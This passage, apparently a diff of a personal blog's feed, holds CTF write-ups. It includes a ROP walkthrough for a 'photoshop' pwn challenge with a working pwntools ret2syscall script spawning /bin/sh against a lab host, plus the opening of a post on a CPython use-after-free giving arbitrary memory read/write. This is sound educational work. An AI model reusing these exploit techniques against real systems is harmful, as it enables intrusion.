-<p>i think a better, more complete solve would completely unwind the obfuscation and have a nice control flow graph to look at instead of just rawdogging different blocks of asm via eyepower, i did want to learn some more tools / frameworks to get this done (if the binary was even more complicated, tracing manually and haphazardly like this would Not be feasible, you would need a more sophisticated approach. unfortunately this is not a level of sophistication i have :S)</p>]]></content><author><name></name></author><summary type="html"><![CDATA[recommended listening for this post is 明日にはすべてが終わるとして by kinokoteikoku.]]></summary></entry><entry><title type="html">tudctf</title><link href="http://localhost:4000/2025/11/15/tudctf.html" rel="alternate" type="text/html" title="tudctf" /><published>2025-11-15T05:40:00+08:00</published><updated>2025-11-15T05:40:00+08:00</updated><id>http://localhost:4000/2025/11/15/tudctf</id><content type="html" xml:base="http://localhost:4000/2025/11/15/tudctf.html"><![CDATA[<p>recommended listening for this post is <a href="https://www.youtube.com/watch?v=JK_hBk2f01k">aoi koi no daidaiiro no hi</a> by masudore</p>
+<p>i think a better, more complete solve would completely unwind the obfuscation and have a nice control flow graph to look at instead of just rawdogging different blocks of asm via eyepower, i did want to learn some more tools / frameworks to get this done (if the binary was even more complicated, tracing manually and haphazardly like this would Not be feasible, you would need a more sophisticated approach. unfortunately this is not a level of sophistication i have :S)</p>
+
+<h3 id="pwnphotoshop">pwn/photoshop</h3>
+
+<blockquote>
+  <p>name: photoshop</p>
+
+  <p>author: Haowei</p>
+
+  <p>category: pwn</p>
+
+  <p>description: ‘The most cutting-edge image editing program’</p>
+</blockquote>
+
+<p>a lovely challenge by the IHSCHW (Indomitable Human Spirit Chen Haowei), took me around 40min to solve. as an aside its nice to see myself improving at this stuff, i dont think i could have ever solved this during the finals event so to make quick work of it now makes me Feel Good</p>
+
+<p>the plot is quite interesting, it’s a ROP chall with PIE enabled and no libc provided in the dist:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">base</span><span class="p">)</span> <span class="n">wrenches</span><span class="err">@</span><span class="n">kitty</span> <span class="p">(</span><span class="o">~/</span><span class="n">work</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">photoshop</span><span class="o">/</span><span class="n">dist</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">checksec</span> <span class="o">--</span><span class="n">file</span><span class="o">=</span><span class="n">photoshop</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">wrenches</span><span class="o">/</span><span class="n">work</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">photoshop</span><span class="o">/</span><span class="n">dist</span><span class="o">/</span><span class="n">photoshop</span><span class="err">'</span>
+    <span class="n">Arch</span><span class="o">:</span>       <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
+    <span class="n">RELRO</span><span class="o">:</span>      <span class="n">Partial</span> <span class="n">RELRO</span>
+    <span class="n">Stack</span><span class="o">:</span>      <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
+    <span class="n">NX</span><span class="o">:</span>         <span class="n">NX</span> <span class="n">enabled</span>
+    <span class="n">PIE</span><span class="o">:</span>        <span class="n">PIE</span> <span class="n">enabled</span>
+    <span class="n">Stripped</span><span class="o">:</span>   <span class="n">No</span>
+    <span class="n">Debuginfo</span><span class="o">:</span>  <span class="n">Yes</span>
+</code></pre></div></div>
+
+<p>in the dist itself, we’re provided an <code class="language-plaintext highlighter-rouge">icon.png</code>, and the program <code class="language-plaintext highlighter-rouge">mprotect()</code>s  the entire file into r-x memory at a known offset (<code class="language-plaintext highlighter-rouge">0x10000</code>). super interesting! we’re essentially supposed to dig through a <code class="language-plaintext highlighter-rouge">.png</code> file for useful ROP gadgets. we’re also given exactly one byte within the <code class="language-plaintext highlighter-rouge">mprotect()ed</code> region that we can change.</p>
+
+<ul>
+  <li>i definitely think it’s solvable without using this one byte edit, but i ended up having to :(</li>
+</ul>
+
+<p>with a challenge like this, the challenge essentially boils down to getting the right idea, so a lot of creativity is required. the file provided is very large and there are a fuckload of gadgets, 99% of which are useless. how do we know what to do? i’ll walk through a few of my failed ideas before eventually getting to the correct one (a lot of the ideas end up not working because of a lack of gadgets).</p>
+
+<p>(obligatory shoutout to my pwn sensei and friend <a href="https://ndgsghdj.github.io/article/0.html">nikola</a> who solved this in an entirely different way via partial overwrite magic)</p>
+
+<h3 id="failed-idea-number-one-libc-ptr-in-rcx">failed idea number one: libc ptr in rcx</h3>
+
+<p>inspecting the contents of the registers <em>just</em> before our <code class="language-plaintext highlighter-rouge">ret</code> from the main instruction, we see that <code class="language-plaintext highlighter-rouge">rcx</code> is currently pointing to somewhere in libc.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">vmmap</span>
+<span class="p">[</span> <span class="n">Legend</span><span class="o">:</span> <span class="n">Code</span> <span class="o">|</span> <span class="n">Heap</span> <span class="o">|</span> <span class="n">Stack</span> <span class="o">|</span> <span class="n">Writable</span> <span class="o">|</span> <span class="n">ReadOnly</span> <span class="o">|</span> <span class="n">None</span> <span class="o">|</span> <span class="n">RWX</span> <span class="p">]</span>
+<span class="n">Start</span>              <span class="n">End</span>                <span class="n">Size</span>               <span class="n">Offset</span>             <span class="n">Perm</span> <span class="n">Path</span>
+<span class="mh">0x0000000000010000</span> <span class="mh">0x0000000000110000</span> <span class="mh">0x0000000000100000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span>
+<span class="p">...</span>
+<span class="p">[</span> <span class="n">the</span> <span class="n">region</span> <span class="n">below</span> <span class="n">is</span> <span class="n">where</span> <span class="n">rcx</span> <span class="n">points</span> <span class="n">to</span><span class="p">,</span> <span class="n">and</span> <span class="n">it</span> <span class="n">is</span> <span class="n">in</span> <span class="n">libc</span><span class="o">!</span> <span class="p">]</span>
+<span class="mh">0x00007ffff7dd3000</span> <span class="mh">0x00007ffff7f3b000</span> <span class="mh">0x0000000000168000</span> <span class="mh">0x0000000000028000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>  <span class="o">&lt;-</span>  <span class="err">$</span><span class="n">rcx</span>
+<span class="p">...</span>
+<span class="mh">0x00007ffff7ffd000</span> <span class="mh">0x00007ffff7ffe000</span> <span class="mh">0x0000000000001000</span> <span class="mh">0x0000000000036000</span> <span class="n">rw</span><span class="o">-</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>  <span class="o">&lt;-</span>  <span class="err">$</span><span class="n">r13</span>
+<span class="mh">0x00007ffff7ffe000</span> <span class="mh">0x00007ffff7fff000</span> <span class="mh">0x0000000000001000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span>
+<span class="mh">0x00007ffffffdd000</span> <span class="mh">0x00007ffffffff000</span> <span class="mh">0x0000000000022000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span> <span class="p">[</span><span class="n">stack</span><span class="p">]</span>  <span class="o">&lt;-</span>  <span class="err">$</span><span class="n">rsp</span><span class="p">,</span> <span class="err">$</span><span class="n">rbp</span><span class="p">,</span> <span class="err">$</span><span class="n">rsi</span><span class="p">,</span> <span class="err">$</span><span class="n">r14</span>
+</code></pre></div></div>
+
+<p>immediately i tried to think of ways to manipulate this pointer such that it points to <code class="language-plaintext highlighter-rouge">system()</code>. there are actually quite useful gadgets that allow us to do so, such as this <code class="language-plaintext highlighter-rouge">add</code> gadget:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x0000000000014429</span> <span class="o">:</span> <span class="n">add</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esi</span> <span class="p">;</span> <span class="n">ret</span>
+</code></pre></div></div>
+
+<p>accompanied with a <code class="language-plaintext highlighter-rouge">pop rsi ; ret</code> (sidenote, we basically have infinite register control, because <code class="language-plaintext highlighter-rouge">pop [] ; ret</code> is literally just two bytes), we can increment that pointer to point to <code class="language-plaintext highlighter-rouge">system()</code>, pop a <code class="language-plaintext highlighter-rouge">/bin/sh</code> ptr into <code class="language-plaintext highlighter-rouge">rdi</code> and win!</p>
+
+<p>where does this fuck up? no libc provided :( we don’t know any offsets. even so, we still have the issue of…</p>
+
+<h3 id="how-exactly-do-you-plan-to-pop-a-binsh-ptr-into-rdi">how exactly do you plan to ‘pop a /bin/sh ptr into rdi’</h3>
+
+<p>soooo uhh yeah. we can <em>write</em> /bin/sh to the stack, but we don’t actually know where the stack is. this took me quite a while to think about, and i think it is genuinely just a stroke of luck that i managed to figure this out. i will once again present the state of the registers just before our <code class="language-plaintext highlighter-rouge">ret</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">info</span> <span class="n">registers</span>
+<span class="n">rax</span>            <span class="mh">0x0</span>                 <span class="mh">0x0</span>
+<span class="n">rbx</span>            <span class="mh">0x0</span>                 <span class="mh">0x0</span>
+<span class="n">rcx</span>            <span class="mh">0x7ffff7ea7277</span>      <span class="mh">0x7ffff7ea7277</span>
+<span class="n">rdx</span>            <span class="mh">0x0</span>                 <span class="mh">0x0</span>
+<span class="n">rsi</span>            <span class="mh">0x7fffffffda60</span>      <span class="mh">0x7fffffffda60</span>
+<span class="n">rdi</span>            <span class="mh">0x0</span>                 <span class="mh">0x0</span>
+<span class="n">rbp</span>            <span class="mh">0x7fffffffda80</span>      <span class="mh">0x7fffffffda80</span>
+<span class="n">rsp</span>            <span class="mh">0x7fffffffda60</span>      <span class="mh">0x7fffffffda60</span>
+</code></pre></div></div>
+
+<p>additionally, here is the assembly that actually calls the <code class="language-plaintext highlighter-rouge">read</code> instruction.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x00005555555553cd</span> <span class="o">&lt;+</span><span class="mi">516</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">]</span>
+<span class="mh">0x00005555555553d1</span> <span class="o">&lt;+</span><span class="mi">520</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0x108</span>
+<span class="mh">0x00005555555553d6</span> <span class="o">&lt;+</span><span class="mi">525</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">rax</span>
+<span class="mh">0x00005555555553d9</span> <span class="o">&lt;+</span><span class="mi">528</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mh">0x00005555555553de</span> <span class="o">&lt;+</span><span class="mi">533</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x555555555070</span> <span class="o">&lt;</span><span class="n">read</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="mh">0x00005555555553e3</span> <span class="o">&lt;+</span><span class="mi">538</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">rsi</code> is actually just a pointer to the beginning of the buffer we <code class="language-plaintext highlighter-rouge">read()</code> to (knowledge of calling conventions should make this obvious). so, if we just write <code class="language-plaintext highlighter-rouge">/bin/sh</code> with our <code class="language-plaintext highlighter-rouge">read()</code> call before writing the ROP chain proper, we can get <code class="language-plaintext highlighter-rouge">rsi</code> to point to <code class="language-plaintext highlighter-rouge">/bin/sh</code>. great! but rsi is not rdi. how do we turn rsi into rdi??</p>
+
+<h3 id="failed-idea-number-2-xchg">failed idea number 2: xchg</h3>
+
+<p>important context for x86 assembly: the only difference between a <code class="language-plaintext highlighter-rouge">mov rax</code>… and a <code class="language-plaintext highlighter-rouge">mov eax</code>… is that the <code class="language-plaintext highlighter-rouge">rax</code> instr has this <code class="language-plaintext highlighter-rouge">rex</code> prefix <code class="language-plaintext highlighter-rouge">0x48</code> appended to the beginning of the instruction:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="mh">0x0000555555555371</span>
+   <span class="mh">0x555555555371</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">424</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">rax</span><span class="p">,</span><span class="n">rdx</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="mh">0x0000555555555372</span>
+   <span class="mh">0x555555555372</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">425</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="n">edx</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">3</span><span class="n">x</span> <span class="mh">0x0000555555555371</span>
+<span class="mh">0x555555555371</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">424</span><span class="o">&gt;:</span>	<span class="mh">0x48</span>	<span class="mh">0x01</span>	<span class="mh">0xd0</span>
+</code></pre></div></div>
+
+<p>(conversely, the difference between <code class="language-plaintext highlighter-rouge">pop eax</code> and <code class="language-plaintext highlighter-rouge">pop rax</code> is that there is none, it just depends on whether your binary is 32-bit or 64-bit).</p>
+
+<p>given that we wanted to swap <code class="language-plaintext highlighter-rouge">rsi</code> and <code class="language-plaintext highlighter-rouge">rdi</code>, my brilliant idea was to use an <code class="language-plaintext highlighter-rouge">xchg</code> instruction - this is not an instruction you ever see used in ROP, ever, and i thought it would be super Auraful and cool. however, ROPgadget failed to find such a gadget. then, i further thought to use my one-byte write to add that <code class="language-plaintext highlighter-rouge">REX</code> prefix, but an <code class="language-plaintext highlighter-rouge">xchg edi, esi</code> gadget <em>does not exist</em> either! :(</p>
+
+<p>no dice.</p>
+
+<h3 id="failed-idea-number-3-chain-movs">failed idea number 3: chain movs</h3>
+
+<p>mov instructions are pretty common, but what is much less common is mov instructions that use the full 64-bit register (this is because of the prefix requirement above). there’s an abundance of <code class="language-plaintext highlighter-rouge">mov [], []</code>’s, in fact there’s even a <code class="language-plaintext highlighter-rouge">mov edi, esi</code>- the problem is that it is completely unusable:</p>
+
+<p><code class="language-plaintext highlighter-rouge">0x00000000000505d0 : mov edi, esi ; std ; sub byte ptr [rcx], ch ; ja 0x505ce ; pop rdx ; jmp 0x505bf</code></p>
+
+<p>if we wanted to make this a workable instruction we would need to append the <code class="language-plaintext highlighter-rouge">REX</code> prefix <em>and</em> insert a ret at the end. i was perhaps considering if there is some roundabout chain of <code class="language-plaintext highlighter-rouge">movs</code> that would allow us to perform the <code class="language-plaintext highlighter-rouge">mov rsi, rdi</code> (perhaps a <code class="language-plaintext highlighter-rouge">mov rdx, rsi</code>, then a <code class="language-plaintext highlighter-rouge">mov rdi, rdx</code>) - the problem is that this, once again, just does not exist in our file. :(</p>
+
+<h3 id="the-winning-idea-push--pop">the winning idea: push / pop</h3>
+
+<p>eventually i stumbled upon this gadget upon sheer luck (by grepping for <code class="language-plaintext highlighter-rouge">push rsi</code>)</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x000000000001f422</span> <span class="o">:</span> 
+<span class="n">xchg</span> <span class="n">esp</span><span class="p">,</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">cmp</span> <span class="n">ebp</span><span class="p">,</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span><span class="p">]</span> <span class="p">;</span>
+<span class="n">stosb</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span><span class="p">],</span> <span class="n">al</span> <span class="p">;</span> <span class="n">push</span> <span class="n">rsi</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="p">;</span> <span class="n">jmp</span> <span class="mh">0x1f4a1</span>
+</code></pre></div></div>
+
+<p>so this looks hideously unusable but the key here is <code class="language-plaintext highlighter-rouge">push rsi, pop rdi</code>. this is literally <em>just</em> a <code class="language-plaintext highlighter-rouge">mov</code> also! it exists because <code class="language-plaintext highlighter-rouge">push / pop</code> don’t need that REX prefix, so this is literally just two contiguous bytes followed by a <code class="language-plaintext highlighter-rouge">jmp</code> so that ROPgadget picks it up.</p>
+
+<p>we can just use our one-byte write to add a <code class="language-plaintext highlighter-rouge">ret</code> to the end of this and win!</p>
+
+<h3 id="wait-how-do-you-even-win-we-still-dont-know-how-to-call-system">wait how do you even win we still don’t know how to call system()</h3>
+
+<p>okok so actually once you get pointers of arbitrary strings into <code class="language-plaintext highlighter-rouge">rdi</code> (arbitrary string-reference primitive, has this ever been said before?) this becomes trivial because of how many <code class="language-plaintext highlighter-rouge">pop</code> gadgets you have. i just did a <code class="language-plaintext highlighter-rouge">ret2syscall</code> - we pop the execve number into rax, and nulls into rsi and rdx. the solvescript ends up being super small, actually</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./photoshop"</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">"alacritty"</span><span class="p">,</span> <span class="s">"-e"</span><span class="p">,</span> <span class="s">"bash"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">]</span>
+
+<span class="n">edit</span> <span class="o">=</span> <span class="mh">0x1f428</span> <span class="c1"># push rsi ; pop rdi ; ret
+</span><span class="n">ret</span> <span class="o">=</span> <span class="mh">0xc3</span>
+
+<span class="c1">#p = process()
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'172.17.0.2'</span><span class="p">,</span> <span class="mi">5000</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">edit</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ret</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x20</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x2f426</span><span class="p">)</span> <span class="c1"># essentially a mov rdi, rsi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x33a7a</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span> <span class="c1"># pop rax
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x27ae6</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="c1"># pop rsi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x15b60</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="c1"># pop rdx
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1b850</span><span class="p">)</span> <span class="c1"># syscall
+</span>
+<span class="nb">input</span><span class="p">(</span><span class="s">'&gt; ...'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>this gives us our flag.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Welcome</span> <span class="n">to</span> <span class="n">the</span> <span class="n">best</span> <span class="n">image</span> <span class="n">editing</span> <span class="n">software</span><span class="o">!</span>
+<span class="n">Loading</span> <span class="n">image</span><span class="p">...</span>
+<span class="n">You</span> <span class="n">can</span> <span class="n">edit</span> <span class="n">one</span> <span class="n">pixel</span><span class="o">!</span>
+<span class="n">Enter</span> <span class="n">in</span> <span class="n">the</span> <span class="n">index</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">edit</span><span class="o">:</span> <span class="n">Enter</span> <span class="n">in</span> <span class="n">the</span> <span class="n">value</span><span class="o">:</span> <span class="n">Edit</span> <span class="n">successful</span><span class="o">!</span>
+<span class="n">Saving</span> <span class="n">image</span><span class="p">...</span>
+<span class="n">Enter</span> <span class="n">in</span> <span class="n">a</span> <span class="n">review</span><span class="o">?</span> <span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">alps</span>
+<span class="n">total</span> <span class="mi">404</span>
+  <span class="mi">4</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">nobody</span> <span class="n">nogroup</span>   <span class="mi">4096</span> <span class="n">Feb</span> <span class="mi">24</span> <span class="mi">18</span><span class="o">:</span><span class="mi">33</span> <span class="p">.</span><span class="o">/</span>
+  <span class="mi">4</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">nobody</span> <span class="n">nogroup</span>   <span class="mi">4096</span> <span class="n">Feb</span> <span class="mi">24</span> <span class="mi">18</span><span class="o">:</span><span class="mi">33</span> <span class="p">..</span><span class="o">/</span>
+  <span class="mi">4</span> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">nobody</span> <span class="n">nogroup</span>     <span class="mi">45</span> <span class="n">Feb</span> <span class="mi">24</span> <span class="mi">17</span><span class="o">:</span><span class="mi">14</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+<span class="mi">372</span> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">nobody</span> <span class="n">nogroup</span> <span class="mi">380516</span> <span class="n">Feb</span> <span class="mi">24</span> <span class="mi">17</span><span class="o">:</span><span class="mi">14</span> <span class="n">icon</span><span class="p">.</span><span class="n">png</span>
+ <span class="mi">20</span> <span class="o">-</span><span class="n">rwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">nobody</span> <span class="n">nogroup</span>  <span class="mi">19240</span> <span class="n">Feb</span> <span class="mi">24</span> <span class="mi">17</span><span class="o">:</span><span class="mi">14</span> <span class="n">run</span>
+<span class="err">$</span> <span class="n">cat</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">sctf</span><span class="p">{</span><span class="n">credits_to_burner972021_for_all_the_art</span><span class="p">}</span><span class="err">$</span> <span class="n">exit</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">EOF</span> <span class="k">while</span> <span class="n">reading</span> <span class="n">in</span> <span class="n">interactive</span>
+<span class="err">$</span> <span class="n">ls</span>
+<span class="err">$</span> 
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Interrupted</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Closed</span> <span class="n">connection</span> <span class="n">to</span> <span class="mi">172</span><span class="p">.</span><span class="mi">17</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">2</span> <span class="n">port</span> <span class="mi">5000</span>
+</code></pre></div></div>
+
+<h3 id="closing-2">closing</h3>
+
+<p>honestly i love these dumb rop challenges, it requires a level of creativity that i dont typically get to exercise! congrats also to haowei for making the only non-libc given pwn that’s good</p>]]></content><author><name></name></author><summary type="html"><![CDATA[recommended listening for this post is 明日にはすべてが終わるとして by kinokoteikoku.]]></summary></entry><entry><title type="html">tudctf</title><link href="http://localhost:4000/2025/11/15/tudctf.html" rel="alternate" type="text/html" title="tudctf" /><published>2025-11-15T05:40:00+08:00</published><updated>2025-11-15T05:40:00+08:00</updated><id>http://localhost:4000/2025/11/15/tudctf</id><content type="html" xml:base="http://localhost:4000/2025/11/15/tudctf.html"><![CDATA[<p>recommended listening for this post is <a href="https://www.youtube.com/watch?v=JK_hBk2f01k">aoi koi no daidaiiro no hi</a> by masudore</p>
 
 <p>i’m not even a student at tu delft. my dear boyfriend’s friend signed up and sent me some of the chals to do for fun, so here’s two writeups on a rev n a pwn i liked</p>
 
@@ -5686,161 +6347,4 @@ What would you like to <span class="k">do </span>now?
 <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'ccat flag.txt'</span><span class="p">)</span>
 <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[recommended listening for this post is aoi koi no daidaiiro no hi by masudore]]></summary></entry><entry><title type="html">python pwn</title><link href="http://localhost:4000/2025/10/25/python-pwn.html" rel="alternate" type="text/html" title="python pwn" /><published>2025-10-25T03:40:00+08:00</published><updated>2025-10-25T03:40:00+08:00</updated><id>http://localhost:4000/2025/10/25/python-pwn</id><content type="html" xml:base="http://localhost:4000/2025/10/25/python-pwn.html"><![CDATA[<p>recommended listening for this post is <a href="https://www.youtube.com/watch?v=NiV5d6-GKJ4">yeule’s eko</a></p>
-
-<p><img src="/assets/images/560734.png" alt="alt text" />
-in the last post i went over (in excruciating, unasked-for detail) the internals behind a basic uaf vuln in python, and how it creates a buffer w/ a nullptr as its <code class="language-plaintext highlighter-rouge">ob_start</code> and a size that is Extremely Large, leading to arbread and arbwrite.</p>
-
-<p>in this post we are going to pwn python by calling a shell with no imports, no nothing at all. just our uaf and a dream.</p>
-
-<h3 id="where-we-left-off">where we left off</h3>
-
-<p>we left off w/ the following code:</p>
-
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">B</span><span class="p">:</span>
-    <span class="k">def</span> <span class="nf">__index__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-        <span class="k">global</span> <span class="n">memory</span>
-        <span class="n">uaf</span><span class="p">.</span><span class="n">clear</span><span class="p">()</span>
-        <span class="n">memory</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
-        <span class="n">uaf</span><span class="p">.</span><span class="n">extend</span><span class="p">([</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">56</span><span class="p">)</span>
-        <span class="k">return</span> <span class="mi">1</span>
-
-<span class="n">uaf</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">56</span><span class="p">)</span>
-<span class="n">uaf</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="n">B</span><span class="p">()</span>
-</code></pre></div></div>
-
-<p>i wont go over the details, read the other post for that. essentially what this does is it gives us a <em>memory</em> array we can read + write from, where the entire binary’s virtual memory is mapped into this list.</p>
-
-<p>this is a very powerful primitive obvi, and in an actual C based binary, we would leverage this primitive by looking up common www2exec strats. the principles actually <em>do</em> hold here. for example, we could certainly override, say, exit handlers, or just perform FSOP. it’s definitely feasible - see also <a href="https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/">pwn bible</a> for more info on this</p>
-
-<p>but first of all we need to get our leaks! how do we get our leaks?</p>
-
-<p>we’d specifically need a PIE leak, then a libc leak, and both of these are surprisingly nontrivial to get. note that in an actual standard python binary that comes installed in most systems, you do <em>not</em> have PIE. but since i compiled mine from source w debug symbols, i do, and this is something i have to take into account.</p>
-
-<p>(also i hope if you’re reading this, you know what PIE is and i don’t need to explain it)</p>
-
-<p>funnily enough the fact that we have arbitrary read/write to literally any memory is kind of overwhelming in terms of thinking of where to leak - sure, you could just sweep the memory address for pointers to libc and subtract offsets, but you wont know if this actually properly <em>works</em> on various different runs</p>
-
